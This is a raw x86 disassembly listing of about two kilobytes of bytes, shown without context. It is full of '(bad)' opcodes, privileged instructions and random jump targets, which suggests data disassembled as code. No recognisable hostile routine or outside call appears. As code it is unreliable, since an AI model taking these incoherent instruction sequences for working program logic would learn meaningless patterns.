  42469f:	fsub   DWORD PTR [edx-0x27]
  4246a2:	ins    DWORD PTR es:[edi],dx
  4246a3:	xchg   edi,eax
  4246a4:	pop    edx
  4246a5:	or     eax,DWORD PTR [ecx-0x5eebe9a7]
  4246ab:	lods   eax,DWORD PTR ds:[esi]
  4246ac:	adc    al,0xf4
  4246ae:	fisubr DWORD PTR [ebp+0x69]
  4246b1:	stos   DWORD PTR es:[edi],eax
  4246b2:	xor    dh,BYTE PTR [ebp+0x3eb6e370]
  4246b8:	and    eax,0x6db0fe08
  4246bd:	fisttp DWORD PTR ds:0xc85c6695
  4246c3:	je     0x42472d
  4246c5:	lock sbb ah,ah
  4246c8:	fcmovnu st,st(2)
  4246ca:	jbe    0x42466f
  4246cc:	popa   
  4246cd:	imul   ecx,DWORD PTR [esi+0x1af8c849],0x2e53b302
  4246d7:	mov    ch,0xd
  4246d9:	(bad)  
  4246da:	call   0xa7f5f04e
  4246df:	mov    ds:0x44b6c2bc,al
  4246e4:	fcomi  st,st(2)
  4246e6:	int    0xd1
  4246e8:	fistp  QWORD PTR [ebp-0x4d]
  4246eb:	pop    edi
  4246ec:	jae    0x424719
  4246ee:	push   ebp
  4246ef:	popa   
  4246f0:	jecxz  0x424732
  4246f2:	and    dh,bl
  4246f4:	gs int 0xef
  4246f7:	(bad)  
  4246f8:	ins    DWORD PTR es:[edi],dx
  4246f9:	or     ebx,DWORD PTR ds:0x3ddc6d74
  4246ff:	push   ss
  424700:	and    eax,0xa2e8ecaa
  424705:	pop    ebx
  424706:	mov    ebx,0x45a3adb1
  42470b:	aaa    
  42470c:	adc    ebp,DWORD PTR [esp+eax*2]
  42470f:	pushf  
  424710:	shl    BYTE PTR [ebp+0x61],1
  424713:	imul   ebx,DWORD PTR [ebx],0x79
  424716:	sub    dl,bh
  424718:	xor    dh,BYTE PTR [edx+ecx*1-0x3]
  42471c:	rol    DWORD PTR [eax-0x69],0x2e
  424720:	ins    DWORD PTR es:[edi],dx
  424721:	dec    ebp
  424722:	in     al,dx
  424723:	clc    
  424724:	enter  0x5946,0x84
  424728:	push   ecx
  424729:	dec    edx
  42472a:	lahf   
  42472b:	add    BYTE PTR [ebx+0x1b],bl
  42472e:	pop    ebx
  42472f:	stc    
  424730:	iret   
  424731:	clc    
  424732:	add    bh,bl
  424734:	cdq    
  424735:	sub    al,0x31
  424737:	dec    esi
  424738:	cs icebp 
  42473a:	or     eax,0xf285d10d
  42473f:	jns    0x424741
  424741:	dec    ebx
  424742:	jp     0x424781
  424744:	shl    BYTE PTR [ebx-0x18],cl
  424747:	xchg   ebp,eax
  424748:	aam    0x6e
  42474a:	sub    al,0xb4
  42474c:	js     0x4246f5
  42474e:	add    al,0x5e
  424750:	pop    edx
  424751:	jno    0xedaeb377
  424757:	mov    dh,0x59
  424759:	fidiv  DWORD PTR [edx]
  42475b:	push   ebp
  42475c:	scas   eax,DWORD PTR es:[edi]
  42475d:	imul   edi,DWORD PTR [ebx],0x5e
  424760:	aas    
  424761:	test   al,0xb2
  424763:	mov    cl,0xd0
  424765:	add    DWORD PTR cs:[eax],edx
  424768:	xchg   ebp,eax
  424769:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42476a:	(bad)  
  42476b:	loope  0x4247eb
  42476d:	add    DWORD PTR [ebx+0x5b],ebx
  424770:	jecxz  0x424744
  424772:	and    BYTE PTR [ebp-0x57],0x57
  424776:	and    al,0x98
  424778:	mov    al,ds:0xadb67428
  42477d:	mov    DWORD PTR [esi+0x65],ebp
  424780:	mov    eax,0x56ccab34
  424785:	xchg   esi,eax
  424786:	jecxz  0x424756
  424788:	mov    ds:0xdddad8dd,eax
  42478d:	jns    0x4247a5
  42478f:	mov    ebp,0x3b183cac
  424794:	jne    0x42473b
  424796:	bound  esp,QWORD PTR [ebx-0x4cc2128c]
  42479c:	outs   dx,DWORD PTR ds:[esi]
  42479d:	lds    ebx,FWORD PTR [ecx]
  42479f:	mov    eax,ds:0x64856d40
  4247a4:	or     dl,BYTE PTR [eax+edi*2]
  4247a7:	jne    0x424764
  4247a9:	fist   DWORD PTR [esi+0x8707f96]
  4247af:	add    BYTE PTR ds:0xa4ec003c,dl
  4247b5:	mov    dh,0x85
  4247b7:	adc    al,0xc9
  4247b9:	cmc    
  4247ba:	fcmovnu st,st(2)
  4247bc:	lea    esi,[esi-0x10]
  4247bf:	out    0x26,eax
  4247c1:	aas    
  4247c2:	jle    0x42478d
  4247c4:	mov    al,0x62
  4247c6:	inc    ebx
  4247c7:	add    eax,0x6376c10d
  4247cc:	jnp    0x424758
  4247ce:	sub    BYTE PTR [ebp+0x44],al
  4247d1:	add    DWORD PTR [edx],esi
  4247d3:	rcr    bl,1
  4247d5:	(bad)  
  4247d6:	outs   dx,BYTE PTR ds:[esi]
  4247d7:	pop    ebx
  4247d8:	dec    ecx
  4247d9:	pusha  
  4247da:	sbb    BYTE PTR [esi-0xf],0x7d
  4247de:	repnz or DWORD PTR ds:0x152e00f5,eax
  4247e5:	outs   dx,BYTE PTR ds:[esi]
  4247e6:	sbb    ah,BYTE PTR [esp+ebx*4+0x10]
  4247ea:	imul   esi,DWORD PTR [esi+0x6169615c],0xffffffeb
  4247f1:	gs jmp 0xbefb:0xe80d2f41
  4247f9:	mov    ebx,0x6da85433
  4247fe:	sbb    al,0x8f
  424800:	dec    esi
  424801:	fnstcw WORD PTR [edi-0x5a7249da]
  424807:	jbe    0x4247b9
  424809:	rcr    BYTE PTR [ecx-0x4d],0xf4
  42480d:	jb     0x424800
  42480f:	or     BYTE PTR [edi],dl
  424811:	arpl   WORD PTR [ecx+0x7d6036dc],sp
  424817:	xchg   ebp,eax
  424818:	pop    ebx
  424819:	repz inc eax
  42481b:	xor    eax,0xda361657
  424820:	ins    DWORD PTR es:[edi],dx
  424821:	or     BYTE PTR [ebx],bh
  424823:	clc    
  424824:	and    bl,BYTE PTR [ecx-0x7f]
  424827:	pushf  
  424828:	pop    esi
  424829:	or     al,0xb6
  42482b:	pop    ebp
  42482c:	sub    ch,bl
  42482e:	gs mov edx,0xa5465927
  424834:	xor    edx,DWORD PTR [edx-0x7552250]
  42483a:	rol    DWORD PTR [ebp+0x2604652],0xb3
  424841:	repnz repz sub eax,0x20026b6
  424848:	inc    ecx
  424849:	ds ss call 0x618d4914
  424850:	mov    ebp,DWORD PTR [ebp+0x1]
  424853:	sbb    ebp,DWORD PTR [ebx+0x35]
  424856:	push   DWORD PTR [ebx]
  424858:	xor    al,0xe5
  42485a:	ss adc dh,0x76
  42485e:	jmp    0x4c6c2e87
  424863:	dec    edx
  424864:	js     0x424836
  424866:	mov    eax,0x28d7d0b0
  42486b:	dec    ecx
  42486c:	push   edx
  42486d:	cmp    eax,0xb0bf3cfd
  424872:	mov    ah,0xb0
  424874:	jbe    0x424896
  424876:	call   0xd897:0x10db0b5
  42487d:	add    BYTE PTR [esp+ebp*8-0x4f],bl
  424881:	ins    DWORD PTR es:[edi],dx
  424882:	dec    ebx
  424883:	retf   
  424884:	add    dl,bl
  424886:	(bad)  
  424887:	fcmovb st,st(1)
  424889:	cmp    esi,eax
  42488b:	mov    edi,0x2c3d4dd
  424890:	mov    al,0x15
  424892:	push   ss
  424893:	outs   dx,DWORD PTR ds:[esi]
  424894:	pop    ds
  424895:	mov    ds:0x636b6117,eax
  42489a:	sub    ebp,DWORD PTR [ebx]
  42489c:	and    esp,edi
  42489e:	adc    ah,BYTE PTR [edx]
  4248a0:	and    bl,BYTE PTR [ebx-0x2525a3ea]
  4248a6:	jbe    0x424832
  4248a8:	push   cs
  4248a9:	xchg   BYTE PTR [esi-0x163aee95],dl
  4248af:	rcl    BYTE PTR [ecx+0xb],0xb
  4248b3:	mov    bh,0xad
  4248b5:	sbb    eax,0x71a4c23f
  4248ba:	and    eax,0x2c55524e
  4248bf:	pop    esp
  4248c0:	fisubr DWORD PTR [eax+0x47]
  4248c3:	(bad)  
  4248c4:	push   esi
  4248c5:	or     BYTE PTR [ebx],al
  4248c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248c8:	fist   WORD PTR [ecx+0x6e]
  4248cb:	sbb    eax,0xb644adc1
  4248d0:	mov    dl,0xcd
  4248d2:	pop    edx
  4248d3:	push   esi
  4248d4:	xor    al,0x53
  4248d6:	ins    DWORD PTR es:[edi],dx
  4248d7:	mov    ah,0x85
  4248d9:	or     eax,0xb11cfec5
  4248de:	or     eax,DWORD PTR [ecx-0x3d29245d]
  4248e4:	mov    dh,0x53
  4248e6:	jbe    0x424898
  4248e8:	xchg   ebp,eax
  4248e9:	push   0xffffff9a
  4248eb:	fs je  0x424938
  4248ee:	js     0x424910
  4248f0:	loop   0x424908
  4248f2:	sbb    eax,DWORD PTR [esp+ebx*1+0x1418cd72]
  4248f9:	fcomp  QWORD PTR [edx-0x18]
  4248fc:	(bad)  
  4248fe:	sbb    ebx,ecx
  424900:	std    
  424901:	dec    edi
  424902:	xor    eax,0xc0858014
  424907:	or     al,0x2f
  424909:	sub    dl,BYTE PTR [esi+0x2db85e5c]
  42490f:	inc    esi
  424910:	aad    0xa4
  424912:	mov    gs,WORD PTR [edx]
  424914:	jg     0x42494e
  424916:	add    ch,ah
  424918:	pop    edi
  424919:	inc    esi
  42491a:	push   esi
  42491b:	test   al,0x76
  42491d:	imul   ebp,edx,0xfffffff2
  424920:	pop    esp
  424921:	xor    al,0xe
  424923:	adc    BYTE PTR [edx],bl
  424925:	ret    0xe142
  424928:	shl    BYTE PTR [ebp-0x20],cl
  42492b:	popf   
  42492c:	retf   0x1652
  42492f:	(bad)  
  424930:	out    dx,al
  424931:	dec    ebx
  424932:	pop    ebx
  424933:	ins    DWORD PTR es:[edi],dx
  424934:	fcmovnu st,st(4)
  424936:	sbb    eax,0x41118694
  42493b:	jne    0x4248f0
  42493d:	ss push ebx
  42493f:	inc    edi
  424940:	sbb    ebp,DWORD PTR [ebp-0x7a18e6bf]
  424946:	out    dx,al
  424947:	push   ss
  424948:	add    eax,0x88b6b75a
  42494d:	int    0x26
  42494f:	(bad)  
  424950:	mov    BYTE PTR [ebp+0xa],bl
  424953:	fst    QWORD PTR [esi+0x7d04b71a]
  424959:	mov    edi,0xa147929c
  42495e:	jbe    0x4249c9
  424960:	stc    
  424961:	push   es
  424962:	fld    TBYTE PTR [ebp+0x598c8cb3]
  424968:	dec    edx
  424969:	addr16 pop ecx
  42496b:	inc    eax
  42496c:	add    BYTE PTR [esi],bl
  42496e:	imul   ebp,DWORD PTR [esi],0xba696db5
  424974:	ja     0x42495d
  424976:	clc    
  424977:	mov    bh,0x11
  424979:	xor    ah,BYTE PTR [ecx+0x2edb52b0]
  42497f:	rol    BYTE PTR ds:0xf5bbb257,1
  424985:	xchg   ecx,eax
  424986:	push   eax
  424987:	ds mov al,0xd0
  42498a:	push   eax
  42498b:	test   DWORD PTR [ebp-0x5165910c],edi
  424991:	add    BYTE PTR [edi+0x7c1cba26],dh
  424997:	pop    edx
  424998:	loope  0x42499f
  42499a:	push   cs
  42499b:	add    eax,0xedb6da60
  4249a0:	(bad)  
  4249a1:	jg     0x4249da
  4249a3:	push   esi
  4249a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249a5:	in     al,dx
  4249a6:	sbb    ah,BYTE PTR [esi]
  4249a8:	imul   esp,ebp,0xffffff9e
  4249ab:	cmp    DWORD PTR [esi],edx
  4249ad:	mov    dh,0xb6
  4249af:	xchg   BYTE PTR [ecx-0x53],bh
  4249b2:	mov    ecx,0x9151d98a
  4249b7:	fyl2xp1 
  4249b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4249ba:	mov    dh,0xdd
  4249bc:	xchg   edx,eax
  4249bd:	loopne 0x4249a3
  4249bf:	cwde   
  4249c0:	aas    
  4249c1:	adc    DWORD PTR ds:0xe800f7d7,ebx
  4249c7:	sahf   
  4249c8:	push   esi
  4249c9:	ins    DWORD PTR es:[edi],dx
  4249ca:	fild   DWORD PTR [esi-0x4f]
  4249cd:	shr    BYTE PTR [esi-0xd],0xfb
  4249d1:	mov    ecx,0x6d85add0
  4249d6:	cmp    DWORD PTR [edx-0x7a3afd96],0x1768b896
  4249e0:	dec    edx
  4249e1:	fcomi  st,st(0)
  4249e3:	hlt    
  4249e4:	(bad)
  4249e8:	and    ecx,DWORD PTR [esi+0x74]
  4249eb:	ins    DWORD PTR es:[edi],dx
  4249ec:	fild   DWORD PTR [edi+edx*1+0x24]
  4249f0:	push   0x478c2140
  4249f5:	es adc eax,0x50a163bc
  4249fb:	push   0xe
  4249fd:	hlt    
  4249fe:	aaa    
  4249ff:	mov    eax,0x5866f38d
  424a04:	push   0x258acb63
  424a09:	cwde   
  424a0a:	sbb    eax,0x6b6dbf67
  424a0f:	cmp    esp,eax
  424a11:	out    0x2e,al
  424a13:	xor    edi,edx
  424a15:	push   eax
  424a16:	cmp    ebx,DWORD PTR [edx+eiz*8-0x74]
  424a1a:	fild   DWORD PTR [esi-0x7]
  424a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a1e:	xor    al,0x23
  424a20:	inc    edx
  424a21:	pop    ds
  424a22:	add    BYTE PTR [ebp+0x2c],bh
  424a25:	outs   dx,DWORD PTR ds:[esi]
  424a26:	je     0x4249f0
  424a28:	ja     0x4249e5
  424a2a:	shr    BYTE PTR [esi-0x53],1
  424a2d:	into   
  424a2e:	(bad)  
  424a2f:	cwde   
  424a30:	loope  0x424a5d
  424a32:	mov    edi,0x56f62782
  424a37:	pop    ebx
  424a38:	fcmovnbe st,st(2)
  424a3a:	inc    edx
  424a3b:	mov    ebx,0x4163a709
  424a40:	push   edx
  424a41:	dec    ecx
  424a42:	out    dx,eax
  424a43:	test   DWORD PTR [esi],eax
  424a45:	mov    edx,0x952f62b5
  424a4a:	jno    0x424a7f
  424a4c:	xchg   ebp,eax
  424a4d:	out    dx,eax
  424a4e:	int    0xb2
  424a50:	mov    ah,0x75
  424a52:	aam    0x8f
  424a54:	aad    0x36
  424a56:	xor    esi,DWORD PTR [ecx+0x1d]
  424a59:	fwait
  424a5a:	lods   al,BYTE PTR ds:[esi]
  424a5b:	sub    ch,BYTE PTR [esi+0x1b]
  424a5e:	fild   DWORD PTR [ebp+0x4d]
  424a61:	and    al,0x78
  424a63:	fwait
  424a64:	jge    0x424ab9
  424a66:	stos   BYTE PTR es:[edi],al
  424a67:	mov    ah,0x74
  424a69:	mov    eax,ds:0xf77ece0b
  424a6e:	inc    esi
  424a6f:	pop    edi
  424a70:	inc    ecx
  424a71:	lods   eax,DWORD PTR ds:[esi]
  424a72:	ret    0xb6d6
  424a75:	pop    ebp
  424a76:	mov    edi,0xddb93e04
  424a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a7c:	jecxz  0x424a6c
  424a7e:	sbb    DWORD PTR [eax+0x68],ebx
  424a81:	pop    ebx
  424a82:	shl    edi,1
  424a84:	sub    al,al
  424a86:	imul   ebp,DWORD PTR [ecx-0x5c9c9e38],0xffffffdd
  424a8d:	pusha  
  424a8e:	jg     0x424a78
  424a90:	pop    esp
  424a91:	iret   
  424a92:	stos   DWORD PTR es:[edi],eax
  424a93:	test   al,0xca
  424a95:	add    DWORD PTR [esi+0x436dda36],esi
  424a9b:	mov    al,0x1a
  424a9d:	xchg   ecx,eax
  424a9e:	outs   dx,BYTE PTR ds:[esi]
  424a9f:	in     al,0x5
  424aa1:	push   ebp
  424aa2:	sub    al,0xd6
  424aa4:	push   ss
  424aa5:	outs   dx,BYTE PTR ds:[esi]
  424aa6:	xchg   BYTE PTR [esi+0x5],dl
  424aa9:	loop   0x424b21
  424aab:	xchg   edi,eax
  424aac:	rcr    BYTE PTR ds:0xdb0b6ed7,1
  424ab2:	ret    0xb5f3
  424ab5:	jmp    0x395ec725
  424aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424abb:	lds    edx,FWORD PTR [ecx]
  424abd:	pop    eax
  424abe:	mov    edx,0x6b0b95b1
  424ac3:	outs   dx,BYTE PTR ds:[esi]
  424ac4:	ins    BYTE PTR es:[edi],dx
  424ac5:	(bad)  
  424ac6:	test   BYTE PTR [edi],ch
  424ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ac9:	mov    cl,0x55
  424acb:	pop    ebx
  424acc:	pop    ebx
  424acd:	and    ch,BYTE PTR ds:0x5e2047dd
  424ad3:	and    eax,ebx
  424ad5:	push   ss
  424ad6:	mov    dh,0xad
  424ad8:	loope  0x424b4b
  424ada:	sbb    ch,BYTE PTR [esi+esi*2]
  424add:	or     bl,BYTE PTR [esi-0x5692876b]
  424ae3:	pop    ebp
  424ae4:	pop    eax
  424ae5:	push   0xffffffbc
  424ae7:	pop    ds
  424ae8:	mov    WORD PTR [edx+ebp*4+0x3b],ss
  424aec:	mov    cl,ch
  424aee:	pop    ebx
  424aef:	push   0x3521b74b
  424af4:	pop    edi
  424af5:	stos   DWORD PTR es:[edi],eax
  424af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424af7:	(bad)  
  424af8:	jp     0x424aee
  424afa:	or     al,0xd4
  424afd:	outs   dx,BYTE PTR ds:[esi]
  424afe:	pop    ebp
  424aff:	jno    0x424aec
  424b01:	mov    edi,0x698983a2
  424b06:	dec    ebp
  424b07:	xchg   BYTE PTR [ebx+0x63],bl
  424b0a:	pop    ebx
  424b0b:	mov    edx,0x3510cd9e
  424b10:	imul   esi,DWORD PTR [ecx-0x72],0xffffff87
  424b14:	ds cmp al,0xc6
  424b17:	mov    dh,0x2d
  424b19:	ins    BYTE PTR es:[edi],dx
  424b1a:	fcomp  QWORD PTR [ebp-0x3dd1c1c5]
  424b21:	or     DWORD PTR [edi],edi
  424b23:	inc    edx
  424b24:	mov    ah,0xb
  424b26:	retf   
  424b27:	inc    ebp
  424b28:	stc    
  424b29:	xor    al,0xd2
  424b2b:	xor    DWORD PTR [ecx+0x0],ebx
  424b2e:	ret    0x8b56
  424b31:	fisubr DWORD PTR [eax+0x7a]
  424b34:	das    
  424b35:	pop    esi
  424b36:	cmp    bh,BYTE PTR [ebp+edi*8-0x20]
  424b3a:	push   esi
  424b3b:	jecxz  0x424ae4
  424b3d:	scas   al,BYTE PTR es:[edi]
  424b3e:	inc    ebp
  424b3f:	push   ebp
  424b40:	pop    edx
  424b41:	das    
  424b42:	sbb    bh,dl
  424b44:	mov    ecx,0xa16ddb6d
  424b49:	xchg   ebp,eax
  424b4a:	add    al,0x66
  424b4c:	xchg   al,al
  424b4e:	ins    BYTE PTR es:[edi],dx
  424b4f:	mov    edi,0x75c5027
  424b54:	mov    bh,0x6d
  424b56:	mov    ds:0x7770c0dd,eax
  424b5b:	mov    ah,0xcb
  424b5d:	outs   dx,DWORD PTR ds:[esi]
  424b5e:	jnp    0x424bd4
  424b60:	push   0x67c1b5ad
  424b65:	pop    ecx
  424b66:	adc    ch,dh
  424b68:	retf   0x4b47
  424b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b6c:	pop    edx
  424b6d:	pop    eax
  424b6e:	les    edx,FWORD PTR [esi]
  424b70:	add    al,0xb0
  424b72:	xlat   BYTE PTR ds:[ebx]
  424b73:	pop    edi
  424b74:	sar    DWORD PTR [ebx-0x254bd3d3],cl
  424b7a:	dec    ebp
  424b7b:	jo     0x424b0b
  424b7d:	push   0xd
  424b7f:	push   cs
  424b80:	inc    ebp
  424b81:	or     al,0x98
  424b83:	mov    BYTE PTR [edx-0x1f],0x46
  424b87:	or     DWORD PTR [edi-0x1ce980f9],ebp
  424b8d:	sub    bh,BYTE PTR [edx-0x5e12912f]
  424b93:	xchg   ecx,eax
  424b94:	mov    dh,0xc5
  424b96:	jmp    0xdbe4:0x4387d752
  424b9d:	test   DWORD PTR [esi],eax
  424b9f:	add    BYTE PTR [esp+esi*8-0xd69b25d],ch
  424ba6:	(bad)  
  424ba7:	fcmovb st,st(6)
  424ba9:	lods   eax,DWORD PTR ds:[esi]
  424baa:	ins    DWORD PTR es:[edi],dx
  424bab:	fnsave [esi-0x7263e268]
  424bb1:	mov    edx,0x746db074
  424bb6:	adc    BYTE PTR [edi+0x21086347],dl
  424bbc:	popf   
  424bbd:	iret   
  424bbe:	iret   
  424bbf:	pop    ebx
  424bc0:	popa   
  424bc1:	mov    ebx,0xb1a0bfb1
  424bc6:	fnstenv [edi+0x11]
  424bc9:	xchg   ebx,eax
  424bca:	mov    eax,0xdb4b6e8f
  424bcf:	(bad)  
  424bd0:	add    bh,BYTE PTR [edi]
  424bd2:	mov    eax,edx
  424bd4:	les    ecx,FWORD PTR [ecx-0x25d34f1e]
  424bda:	pop    eax
  424bdb:	call   0x5b2abf62
  424be0:	rcr    BYTE PTR [ebx],1
  424be2:	push   esp
  424be3:	jne    0xe99cf904
  424be9:	xor    eax,0x8532e188
  424bee:	pop    es
  424bef:	ret    0x6db6
  424bf2:	lea    edi,[edx+ebp*1+0x50]
  424bf6:	xor    dh,BYTE PTR [ecx+0xd]
  424bf9:	out    0xf9,al
  424bfb:	adc    BYTE PTR [edi-0x1439244a],al
  424c01:	lahf   
  424c02:	ss push cs
  424c04:	dec    eax
  424c05:	mov    edx,0x6daa3535
  424c0a:	imul   esi,DWORD PTR [edi],0xffffffb6
  424c0d:	retf   0x2b7a
  424c10:	cmp    eax,0x77da6477
  424c15:	mov    eax,ds:0x51b5b86e
  424c1a:	test   al,0x37
  424c1c:	test   DWORD PTR [esi-0x2f],edi
  424c1f:	pop    ebx
  424c20:	cmp    eax,DWORD PTR [ecx+eax*4]
  424c23:	push   0x56765451
  424c28:	out    dx,al
  424c29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c2a:	in     eax,dx
  424c2b:	mov    dh,0x44
  424c2d:	xor    DWORD PTR [edi-0x64d26ead],edi
  424c33:	xchg   BYTE PTR [edi+0x6dbe5b76],cl
  424c39:	or     BYTE PTR [ecx+ebx*2-0x24ff65b8],dh
  424c40:	push   edi
  424c41:	inc    esp
  424c42:	sbb    al,0x33
  424c44:	jno    0x424c98
  424c46:	sbb    eax,0xffffffda
  424c49:	(bad)  
  424c4a:	lods   eax,DWORD PTR ds:[esi]
  424c4b:	ds int 0x63
  424c4e:	mov    ecx,0xe142e96a
  424c53:	mov    ebx,0xd4377957
  424c58:	cli    
  424c59:	sub    DWORD PTR [edx+0x7a585b6b],ebx
  424c5f:	and    DWORD PTR [ebp+0x62],edx
  424c62:	inc    edx
  424c63:	add    al,0x14
  424c65:	or     BYTE PTR [esi-0x7a7a520f],dl
  424c6b:	jbe    0x424ca6
  424c6d:	ss mov bl,0x43
  424c70:	push   ebx
  424c71:	std    
  424c72:	sub    BYTE PTR [ecx+0x75],cl
  424c75:	adc    BYTE PTR [edi-0x61fdf74a],dl
  424c7b:	pop    edi
  424c7c:	inc    esp
  424c7d:	cmp    al,0x48
  424c7f:	mov    edx,0x2dba5b5b
  424c84:	out    0x73,al
  424c86:	sahf   
  424c87:	in     eax,dx
  424c88:	inc    ebx
  424c89:	enter  0x7423,0x77
  424c8d:	(bad)  
  424c8e:	xchg   edi,eax
  424c8f:	xchg   esi,eax
  424c90:	sbb    cl,BYTE PTR [eax-0x5bd768cf]
  424c96:	pop    eax
  424c97:	sbb    eax,0xdb521edc
  424c9c:	adc    al,0x15
  424c9e:	pop    ds
  424c9f:	lahf   
  424ca0:	mov    eax,0x6c2dbc0b
  424ca5:	or     eax,0x29f92fed
  424caa:	or     bl,BYTE PTR [ecx-0x4d]
  424cad:	cmp    BYTE PTR [edx],0x8a
  424cb0:	mov    DWORD PTR [ebp+0x12ecb6a5],ebp
  424cb6:	rol    DWORD PTR [ebx+0xd9255d3],1
  424cbc:	fist   DWORD PTR [esi+0x5e816b7f]
  424cc2:	mov    ch,0x2e
  424cc4:	add    BYTE PTR [ebp+0x5b400b5],al
  424cca:	cmp    bl,ch
  424ccc:	(bad)  
  424ccd:	push   eax
  424cce:	mov    edx,0xc26c5ad0
  424cd3:	cmp    bh,BYTE PTR [ecx-0x4ff92e1f]
  424cd9:	mov    cl,0xb0
  424cdb:	mov    DWORD PTR [edi-0x5cf0b4cc],edx
  424ce1:	or     BYTE PTR [ebp+0x37],ch
  424ce4:	fidivr DWORD PTR ss:[esi+0x16]
  424ce8:	js     0x424d1d
  424cea:	cmp    al,0x5b
  424cec:	leave  
  424ced:	mov    dh,0x3
  424cef:	pusha  
  424cf0:	stos   DWORD PTR es:[edi],eax
  424cf1:	pop    ebp
  424cf2:	push   0xffffffc4
  424cf4:	mov    ebx,?
  424cf6:	jb     0x424d54
  424cf8:	mov    ds:0x6976b665,eax
  424cfd:	pop    ecx
  424cfe:	xchg   ebx,eax
  424cff:	retf   
  424d00:	bound  ebx,QWORD PTR ds:0x6277bf5d
  424d06:	popa   
  424d07:	inc    ecx
  424d08:	fcom   QWORD PTR [esi-0x1fd1f46a]
  424d0e:	add    esi,DWORD PTR [ebx+0x5b68f0a7]
  424d14:	(bad)
  424d17:	dec    esp
  424d18:	jno    0x424cc7
  424d1a:	js     0x424d7e
  424d1c:	jge    0x424cd4
  424d1e:	adc    bl,BYTE PTR [ebp-0x28]
  424d21:	add    edx,DWORD PTR [edx+0x37]
  424d24:	test   eax,0x659b45e
  424d29:	inc    edx
  424d2a:	mov    ebx,0x98555b1
  424d2f:	mov    bh,BYTE PTR [ebx]
  424d31:	shl    DWORD PTR [ebx+0x46c6c28b],cl
  424d37:	jmp    0xdbe6f232
  424d3c:	pop    ecx
  424d3d:	mov    ah,0xcc
  424d3f:	xor    al,0x50
  424d41:	mov    edx,0x7156dbb5
  424d46:	das    
  424d47:	jmp    0x424ce4
  424d49:	(bad)  
  424d4b:	retf   
  424d4c:	mov    eax,ds:0x6e89adb6
  424d51:	push   ebx
  424d52:	repnz mov esp,0x55e6bbb1
  424d58:	inc    esp
  424d59:	bound  ebp,QWORD PTR [edi-0x24]
  424d5c:	fcom   DWORD PTR [esi]
  424d5e:	call   0xd924ebd8
  424d63:	stos   BYTE PTR es:[edi],al
  424d64:	xor    ebp,DWORD PTR [edx]
  424d66:	rol    DWORD PTR [eax],1
  424d68:	xchg   al,bl
  424d6a:	push   0x17
  424d6c:	sahf   
  424d6d:	mov    bh,0x42
  424d6f:	or     BYTE PTR [edi-0x2e],0xd4
  424d73:	std    
  424d74:	popf   
  424d75:	xor    al,0x62
  424d77:	pop    ebx
  424d78:	fsubr  DWORD PTR [ecx-0x50]
  424d7b:	pop    eax
  424d7c:	pop    ds
  424d7d:	dec    edx
  424d7e:	jbe    0x424d7e
  424d80:	ins    BYTE PTR es:[edi],dx
  424d81:	xor    al,0xd0
  424d83:	push   es
  424d84:	test   bh,bh
  424d86:	sahf   
  424d87:	mov    ?,WORD PTR [esi+esi*4-0x4e44a45e]
  424d8e:	addr16 cld 
  424d90:	ins    DWORD PTR es:[edi],dx
  424d91:	ins    DWORD PTR es:[edi],dx
  424d92:	loopne 0x424d38
  424d94:	lock mov ebx,gs
  424d97:	mov    dh,0x60
  424d99:	jmp    0x1721:0x6a023792
  424da0:	repnz xchg edx,eax
  424da2:	mov    eax,0x541a3617
  424da7:	ja     0x424d39
  424da9:	jg     0x424d99
  424dab:	aad    0xf2
  424dad:	jbe    0x424e18
  424daf:	imul   edi,ecx,0xc2e100
  424db5:	leave  
  424db6:	mov    edx,0xd965ecc2
  424dbb:	dec    esi
  424dbc:	(bad)
  424dbf:	fcmovnb st,st(6)
  424dc1:	(bad)  
  424dc2:	mov    ebp,0x300b71de
  424dc7:	repnz mov ebp,0xd11a163
  424dcd:	adc    BYTE PTR [ecx+0xb36c285],cl
  424dd3:	ins    BYTE PTR es:[edi],dx
  424dd4:	fwait
  424dd5:	imul   esi,DWORD PTR [ecx+0x85a2fbf],0xb68bbd60
  424ddf:	ins    DWORD PTR es:[edi],dx
  424de0:	xchg   edi,eax
  424de1:	sbb    al,0x51
  424de3:	and    ecx,DWORD PTR [edi+0x1d5cceba]
  424de9:	das    
  424dea:	mov    dh,0xa5
  424dec:	test   DWORD PTR [ebp+0x347da4a5],eax
  424df2:	jp     0x424daf
  424df4:	js     0x424d88
  424df6:	imul   esi,DWORD PTR [edi-0x1f223d73],0x5e
  424dfd:	ins    BYTE PTR es:[edi],dx
  424dfe:	jno    0x424d80
  424e00:	pop    ebx
  424e01:	sub    BYTE PTR [ebx+0x14],ch
  424e04:	sub    eax,0x8e616162
  424e09:	jo     0x424e13
  424e0b:	push   ebp
  424e0c:	sub    eax,0x4bb46d13
  424e11:	dec    ebx
  424e12:	mov    WORD PTR [ebp+0x32],ds
  424e15:	aam    0x13
  424e17:	aam    0xd8
  424e19:	push   cs
  424e1a:	outs   dx,BYTE PTR ds:[esi]
  424e1b:	in     eax,dx
  424e1c:	mov    dh,0xb0
  424e1e:	push   eax
  424e1f:	in     eax,0x1
  424e21:	add    eax,DWORD PTR [ebx+0x4dc8fbec]
  424e27:	mov    ch,0x33
  424e29:	test   DWORD PTR [ebp+0x6b],ebp
  424e2c:	or     BYTE PTR [ecx+0x3],bl
  424e2f:	mov    eax,ds:0x4d0d4f6
  424e34:	jne    0x424e61
  424e36:	mov    bh,0x8d
  424e38:	sahf   
  424e39:	xchg   esi,eax
  424e3a:	sbb    ebp,0xffffffd4
  424e3d:	mov    al,0x14
  424e3f:	fdivr  QWORD PTR [ebp+eax*4-0x53]
  424e43:	and    DWORD PTR [edi+0x73],eax
  424e46:	into   
  424e47:	dec    ebx
  424e48:	xchg   al,cl
  424e4a:	inc    eax
  424e4b:	imul   ebx,ebp,0xffffffb6
  424e4e:	fiadd  DWORD PTR ds:0x6b6deca8
  424e54:	inc    edi
  424e55:	adc    edi,0xfffffffd
